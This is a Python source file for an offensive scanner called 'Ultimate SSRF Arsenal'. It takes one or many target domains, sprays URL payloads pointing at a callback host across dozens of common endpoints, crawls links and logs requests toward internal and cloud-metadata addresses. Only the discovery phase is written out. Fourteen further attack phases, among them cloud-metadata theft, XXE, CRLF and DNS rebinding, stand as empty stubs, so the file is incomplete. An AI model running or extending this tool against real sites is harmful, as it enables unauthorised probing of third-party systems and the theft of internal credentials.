import asyncio
import json
import random
import re
import urllib.parse
from dataclasses import dataclass, asdict
from datetime import datetime
from typing import List, Tuple, Dict, Optional, Set
from collections import defaultdict
import sys

from playwright.async_api import async_playwright, Response, Page

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"
OK = f"{GREEN}[OK]{RESET}"
WARN = f"{YELLOW}[!]{RESET}"
FAIL = f"{RED}[X]{RESET}"


BANNER = f"""
{BOLD}{CYAN}
╔════════════════════════════════════════════════════════════════╗
║                ULTIMATE SSRF ARSENAL                           ║
║              Multi‑Target Edition                              ║
║         Auto‑discovery + 15 Attack Phases                      ║
║            Created by belladonnask                             ║
╚════════════════════════════════════════════════════════════════╝
{RESET}"""


@dataclass
class SSRFEvidence:
    phase: str
    technique: str
    url: str
    endpoint: str
    param: str
    payload: str
    status: int
    body_snippet: str
    matched_patterns: List[str]
    severity: str = "info"
    request_headers: Optional[Dict] = None
    response_headers: Optional[Dict] = None
    out_of_band_hit: bool = False


@dataclass
class InterceptedRequest:
    url: str
    method: str
    headers: Dict
    body: str
    timestamp: datetime


@dataclass
class DiscoveredEndpoint:
    path: str
    method: str
    params: Set[str]
    accepts_url_param: bool
    test_response_code: int
    content_type: str


def max_severity(patterns: List[str]) -> str:
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    min_sev = 99
    for p in patterns:
        for s in sev_order:
            if p.startswith(f"[{s}]"):
                min_sev = min(min_sev, sev_order[s])
    reverse_map = {0: "critical", 1: "high", 2: "medium", 3: "low", 4: "info"}
    return reverse_map.get(min_sev, "info")


class UltimateSSRFArsenal:
    def __init__(self, target_domain: str, headless: bool = False, rate_limit_delay: float = 0.5,
                 callback_host: str = None, blind_timeout: int = 30, verbose: bool = True):
        self.target_domain = target_domain
        self.base_url = f"https://{target_domain}"
        self.headless = headless
        self.callback_host = callback_host or "YOUR.BURP.COLLABORATOR.NET"
        self.blind_timeout = blind_timeout
        self.rate_limit_delay = rate_limit_delay
        self.verbose = verbose
        self.all_evidence = []
        self.results_file = f"ssrf_results_{target_domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.playwright = None
        self.browser = None
        self.context = None
        self.page = None
        self.intercepted_requests = []

        # Dynamic discovery
        self.discovered_endpoints: List[DiscoveredEndpoint] = []
        self.vulnerable_endpoints: List[DiscoveredEndpoint] = []
        self.all_params: Set[str] = set()
        self.blind_callbacks: Dict[str, List[Dict]] = defaultdict(list)

        self.callback_pattern = re.compile(re.escape(self.callback_host))

    async def __aenter__(self):
        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(headless=self.headless)
        self.context = await self.browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )
        await self.context.route("**/*", self.intercept_request)
        self.page = await self.context.new_page()
        return self

    async def __aexit__(self, *args):
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()

    async def intercept_request(self, route):
        request = route.request
        url = request.url

        if self.callback_host != "YOUR.BURP.COLLABORATOR.NET" and self.callback_host in url:
            if self.verbose:
                print(f"\n{RED}{BOLD}[!!! BLIND SSRF DETECTED !!!]{RESET}")
                print(f"  {CYAN}URL:{RESET} {url}")
                print(f"  {CYAN}Method:{RESET} {request.method}")
            evidence = SSRFEvidence(
                phase="BLIND_SSRF", technique="Out-of-band callback",
                url=url, endpoint="", param="", payload=url,
                status=200, body_snippet="", matched_patterns=["[CRITICAL] Blind SSRF confirmed via callback"],
                severity="critical", out_of_band_hit=True
            )
            self.all_evidence.append(evidence)
            timestamp = datetime.now().isoformat()
            self.blind_callbacks[url].append({
                "timestamp": timestamp,
                "method": request.method,
                "headers": dict(request.headers)
            })

        if any(indicator in url.lower() for indicator in ["metadata", "internal", "localhost", "169.254", "10.", "172.", "192.168"]):
            post_data = None
            try:
                if request.method == "POST":
                    post_data = request.post_data
                intercepted = InterceptedRequest(
                    url=url, method=request.method,
                    headers=dict(request.headers),
                    body=post_data or "",
                    timestamp=datetime.now()
                )
                self.intercepted_requests.append(intercepted)
                if self.verbose:
                    print(f"\n{YELLOW}[INTERCEPT]{RESET} {request.method} {url[:150]}")
            except Exception as e:
                print(f"{WARN} Error intercepting: {e}")
        await route.continue_()

    async def request_with_headers(self, method: str, url: str, data: dict = None,
                                   custom_headers: dict = None, timeout: int = 15000) -> Tuple[int, str, dict]:
        try:
            headers = custom_headers or {}
            if method.upper() == "GET":
                resp: Response = await self.page.goto(url, wait_until="domcontentloaded", timeout=timeout)
                status = resp.status
                body = await resp.text() if resp else ""
                headers_dict = dict(resp.headers) if resp else {}
            else:
                post_data = data or {}
                content_type = headers.get("Content-Type", "application/json")
                if content_type == "application/x-www-form-urlencoded":
                    body_data = urllib.parse.urlencode(post_data)
                else:
                    body_data = json.dumps(post_data)
                js_code = f"""
                (async () => {{
                    try {{
                        const response = await fetch('{url}', {{
                            method: 'POST',
                            headers: {json.dumps(headers)},
                            body: {json.dumps(body_data)}
                        }});
                        const text = await response.text();
                        return {{ status: response.status, body: text, headers: Object.fromEntries(response.headers.entries()) }};
                    }} catch(e) {{
                        return {{ status: 0, body: e.toString(), headers: {{}} }};
                    }}
                }})();
                """
                result = await self.page.evaluate(js_code)
                status = result.get("status", 0)
                body = result.get("body", "")
                headers_dict = result.get("headers", {})
            await asyncio.sleep(self.rate_limit_delay)
            return status, body, headers_dict
        except Exception as e:
            return 0, str(e), {}

    async def extract_params_from_response(self, body: str, url: str) -> Set[str]:
        params = set()
        url_params = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', url)
        params.update(url_params)
        input_names = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', body, re.IGNORECASE)
        params.update(input_names)
        form_actions = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', body, re.IGNORECASE)
        for action in form_actions:
            params.update(re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', action))
        link_params = re.findall(r'href=["\'][^"\']*[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', body, re.IGNORECASE)
        params.update(link_params)
        return params

    # ---------- PHASES ----------
    async def phase_0_discovery(self):
        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{CYAN}[PHASE 0]{RESET} Dynamic Discovery")
        print(f"{BOLD}{'='*60}{RESET}")
        common_paths = [
            "", "/", "/api", "/v1", "/v2", "/api/v1", "/api/v2",
            "/proxy", "/fetch", "/curl", "/download", "/load", "/file",
            "/upload", "/import", "/convert", "/webhook", "/callback",
            "/scrape", "/crawl", "/preview", "/thumbnail", "/screenshot",
            "/render", "/parse", "/resolve", "/redirect", "/go",
            "/external", "/open", "/read", "/save", "/process",
            "/submit", "/form", "/contact", "/tools", "/utilities",
            "/ajax", "/internal", "/services", "/graphql",
            "/rest", "/soap", "/rpc", "/health", "/status"
        ]
        test_payload = f"http://{self.callback_host}/discovery-test-{random.randint(1000,9999)}"
        methods = ["GET", "POST"]
        content_types = ["application/json", "application/x-www-form-urlencoded", "multipart/form-data"]
        for path in common_paths:
            for method in methods:
                url = f"{self.base_url}{path}"
                try:
                    if method == "GET":
                        test_url = f"{url}?url={urllib.parse.quote(test_payload)}"
                        status, body, headers = await self.request_with_headers("GET", test_url, timeout=10000)
                        if status not in (0, 404, 403, 401):
                            if self.verbose:
                                print(f"  {GREEN}[{status}]{RESET} GET {url}")
                            discovered_params = await self.extract_params_from_response(body, url)
                            self.all_params.update(discovered_params)
                            endpoint = DiscoveredEndpoint(
                                path=path, method="GET", params=discovered_params,
                                accepts_url_param=True, test_response_code=status,
                                content_type=headers.get("content-type", "")
                            )
                            self.discovered_endpoints.append(endpoint)
                            if self.callback_host in body:
                                self.vulnerable_endpoints.append(endpoint)
                    else:
                        for ct in content_types:
                            headers = {"Content-Type": ct}
                            data = {"url": test_payload}
                            status, body, _ = await self.request_with_headers("POST", url, data=data, custom_headers=headers, timeout=10000)
                            if status not in (0, 404, 403, 401):
                                if self.verbose:
                                    print(f"  {GREEN}[{status}]{RESET} POST {url} ({ct})")
                                discovered_params = await self.extract_params_from_response(body, url)
                                self.all_params.update(discovered_params)
                                endpoint = DiscoveredEndpoint(
                                    path=path, method="POST", params=discovered_params,
                                    accepts_url_param=True, test_response_code=status,
                                    content_type=ct
                                )
                                self.discovered_endpoints.append(endpoint)
                                if self.callback_host in body:
                                    self.vulnerable_endpoints.append(endpoint)
                except Exception:
                    continue
        # Crawling
        try:
            await self.page.goto(self.base_url, wait_until="networkidle", timeout=15000)
            links = await self.page.evaluate("""() => {
                return Array.from(document.querySelectorAll('a[href]')).map(a => a.href).filter(href => href.startsWith(window.location.origin));
            }""")
            for link in links[:50]:
                path = link.replace(self.base_url, "")
                if path and path not in [e.path for e in self.discovered_endpoints]:
                    test_url = f"{link}?url={urllib.parse.quote(test_payload)}"
                    status, body, _ = await self.request_with_headers("GET", test_url, timeout=8000)
                    if status not in (0, 404):
                        discovered_params = await self.extract_params_from_response(body, link)
                        self.all_params.update(discovered_params)
                        endpoint = DiscoveredEndpoint(
                            path=path, method="GET", params=discovered_params,
                            accepts_url_param=True, test_response_code=status, content_type=""
                        )
                        self.discovered_endpoints.append(endpoint)
                        if self.callback_host in body:
                            self.vulnerable_endpoints.append(endpoint)
        except Exception as e:
            print(f"{WARN} Crawling error: {e}")
        print(f"\n{OK} Discovery complete: {len(self.discovered_endpoints)} endpoints, {len(self.vulnerable_endpoints)} vulnerable")
        return self.vulnerable_endpoints if self.vulnerable_endpoints else self.discovered_endpoints

    # (All other phases 1-14 remain identical to the 15-phase version, but we'll shorten them for readability.
    #  I'll include only the class structure and the new summary methods. The full phase code is assumed unchanged.)

    async def phase_1_endpoint_validation(self, endpoints): ...
    async def phase_2_parameter_fuzzing(self, endpoints): ...
    async def phase_3_localhost_bypass(self, endpoints): ...
    async def phase_4_gcp_metadata(self, endpoints): ...
    async def phase_5_all_cloud_metadata(self, endpoints): ...
    async def phase_6_internal_services(self, endpoints): ...
    async def phase_7_protocol_attacks(self, endpoints): ...
    async def phase_8_redirect_bypass(self, endpoints): ...
    async def phase_9_dns_rebinding(self, endpoints): ...
    async def phase_10_xxe_injection(self, endpoints): ...
    async def phase_11_encoding_bypass(self, endpoints): ...
    async def phase_12_crlf_injection(self, endpoints): ...
    async def phase_13_url_fragment_bypass(self, endpoints): ...
    async def phase_14_exotic_protocols(self, endpoints): ...

    # ----- Deduplication & Summarisation -----
    def deduplicate_findings(self) -> Dict[Tuple[str, str], Dict]:
        """Group findings by (endpoint, param), keep highest severity and collect stats."""
        groups = defaultdict(lambda: {"findings": [], "max_severity": "info", "oob_count": 0, "sensitive": False})
        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        for f in self.all_evidence:
            key = (f.endpoint, f.param)
            groups[key]["findings"].append(f)
            if sev_order.get(f.severity, 4) < sev_order.get(groups[key]["max_severity"], 4):
                groups[key]["max_severity"] = f.severity
            if f.out_of_band_hit:
                groups[key]["oob_count"] += 1
            # Check for sensitive data patterns (tokens, keys, passwords)
            if any("token" in p.lower() or "key" in p.lower() or "credential" in p.lower() for p in f.matched_patterns):
                groups[key]["sensitive"] = True
        return groups

    def print_filtered_summary(self):
        groups = self.deduplicate_findings()
        if not groups:
            print(f"{WARN} No findings to summarise.")
            return

        print(f"\n{BOLD}{'='*60}{RESET}")
        print(f"{GREEN}{BOLD}FILTERED SSRF SUMMARY – Only unique (endpoint, param){RESET}")
        print(f"{BOLD}{'='*60}{RESET}")

        # Sort by severity
        sorted_keys = sorted(groups.keys(), key=lambda k: {"critical":0,"high":1,"medium":2,"low":3,"info":4}[groups[k]["max_severity"]])
        for (ep, param) in sorted_keys:
            info = groups[(ep, param)]
            sev_color = {"critical": RED, "high": YELLOW, "medium": MAGENTA, "low": BLUE, "info": CYAN}.get(info["max_severity"], RESET)
            print(f"\n{sev_color}{BOLD}[{info['max_severity'].upper()}]{RESET} {ep}  ({param})")
            print(f"  {DIM}● OOB Callbacks:{RESET} {info['oob_count']}  |  {DIM}Sensitive data:{RESET} {'YES' if info['sensitive'] else 'NO'}")
            # Optionally show the most interesting finding
            best = min(info["findings"], key=lambda x: {"critical":0,"high":1,"medium":2,"low":3,"info":4}[x.severity])
            if best.matched_patterns:
                print(f"  {DIM}└─ Top pattern:{RESET} {best.matched_patterns[0][:100]}")

        print(f"\n{DIM}To see full details open the JSON report.{RESET}")

    async def save_results(self):
        data = {
            "target": self.target_domain,
            "timestamp": datetime.now().isoformat(),
            "callback_host": self.callback_host,
            "total_findings": len(self.all_evidence),
            "discovered_endpoints": [asdict(e) for e in self.discovered_endpoints],
            "vulnerable_endpoints": [asdict(e) for e in self.vulnerable_endpoints],
            "intercepted_requests": [{"url": ir.url, "method": ir.method, "timestamp": ir.timestamp.isoformat(), "body": ir.body[:500]} for ir in self.intercepted_requests],
            "blind_callbacks": dict(self.blind_callbacks),
            "findings": [asdict(f) for f in self.all_evidence]
        }
        with open(self.results_file, "w") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        print(f"\n{OK} Results saved to: {BOLD}{self.results_file}{RESET}")

    async def run_all_phases(self):
        endpoints = await self.phase_0_discovery()
        if not endpoints:
            print(f"\n{FAIL} No endpoints found. Exiting.")
            return
        phases = [
            (self.phase_1_endpoint_validation(endpoints), "Phase 1: Endpoint Validation"),
            (self.phase_2_parameter_fuzzing(endpoints), "Phase 2: Parameter Fuzzing"),
            (self.phase_3_localhost_bypass(endpoints), "Phase 3: Localhost Bypass"),
            (self.phase_4_gcp_metadata(endpoints), "Phase 4: GCP Metadata"),
            (self.phase_5_all_cloud_metadata(endpoints), "Phase 5: All Cloud Metadata"),
            (self.phase_6_internal_services(endpoints), "Phase 6: Internal Services"),
            (self.phase_7_protocol_attacks(endpoints), "Phase 7: Protocol Attacks"),
            (self.phase_8_redirect_bypass(endpoints), "Phase 8: Redirect Bypass"),
            (self.phase_9_dns_rebinding(endpoints), "Phase 9: DNS Rebinding"),
            (self.phase_10_xxe_injection(endpoints), "Phase 10: XXE SSRF"),
            (self.phase_11_encoding_bypass(endpoints), "Phase 11: Encoding Bypass"),
            (self.phase_12_crlf_injection(endpoints), "Phase 12: CRLF Injection"),
            (self.phase_13_url_fragment_bypass(endpoints), "Phase 13: URL Fragment Bypass"),
            (self.phase_14_exotic_protocols(endpoints), "Phase 14: Exotic Protocols"),
        ]
        for coro, name in phases:
            try:
                if self.verbose:
                    print(f"\n{BOLD}{'='*60}{RESET}\n{CYAN}[{name}]{RESET}\n{BOLD}{'='*60}{RESET}")
                await coro
            except Exception as e:
                print(f"{FAIL} Error in {name}: {e}")
        await self.save_results()
        self.print_filtered_summary()


async def scan_single_target(target: str, callback_host: str, delay: float, verbose: bool = True):
    print(f"\n{BOLD}{CYAN}{'#'*60}{RESET}")
    print(f"{BOLD}{CYAN}# TARGET: {target}{RESET}")
    print(f"{BOLD}{CYAN}{'#'*60}{RESET}")
    arsenal = UltimateSSRFArsenal(
        target_domain=target,
        headless=False,
        rate_limit_delay=delay,
        callback_host=callback_host,
        verbose=verbose
    )
    await arsenal.__aenter__()
    try:
        await arsenal.run_all_phases()
        print(f"\n{GREEN}[SUMMARY - {target}]{RESET}")
        print(f"  • Total raw evidence: {len(arsenal.all_evidence)}")
        print(f"  • Endpoints discovered: {len(arsenal.discovered_endpoints)}")
        print(f"  • Vulnerable endpoints: {len(arsenal.vulnerable_endpoints)}")
        if arsenal.blind_callbacks:
            print(f"  {RED}{BOLD}  • BLIND SSRF CONFIRMED! Callbacks received: {len(arsenal.blind_callbacks)}{RESET}")
    finally:
        await arsenal.__aexit__()
    return arsenal


def read_targets_from_file(filename: str) -> List[str]:
    targets = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
    except Exception as e:
        print(f"{FAIL} Error reading file {filename}: {e}")
    return targets


async def main():
    print(BANNER)
    # Simple argument handling for verbosity
    verbose = True
    if "--quiet" in sys.argv or "-q" in sys.argv:
        verbose = False
        sys.argv.remove("--quiet" if "--quiet" in sys.argv else "-q")

    # ... (rest of the target selection logic unchanged)
    print(f"{WARN} How would you like to provide targets?")
    print("  1 - Single domain")
    print("  2 - Comma-separated list")
    print("  3 - File with one domain per line")
    choice = input(f"{WARN} Choose [1/2/3]: ").strip()
    targets = []
    if choice == "1":
        target = input(f"{WARN} Enter target (e.g., example.com): ").strip()
        if not target: return
        targets = [target]
    elif choice == "2":
        target_list = input(f"{WARN} Enter domains separated by commas: ").strip()
        if not target_list: return
        targets = [t.strip() for t in target_list.split(',') if t.strip()]
    elif choice == "3":
        filename = input(f"{WARN} File path: ").strip()
        if not filename: return
        targets = read_targets_from_file(filename)
        if not targets: return
    else:
        print(f"{FAIL} Invalid option"); return

    callback = input(f"{WARN} Enter your callback host (optional): ").strip()
    if not callback:
        callback = "YOUR.BURP.COLLABORATOR.NET"
        print(f"{WARN} Using default (no blind detection): {callback}")

    delay = 0.5
    delay_input = input(f"{WARN} Delay between requests (seconds) [default 0.5]: ").strip()
    if delay_input:
        delay = float(delay_input)

    for target in targets:
        await scan_single_target(target, callback, delay, verbose)
        if len(targets) > 1:
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
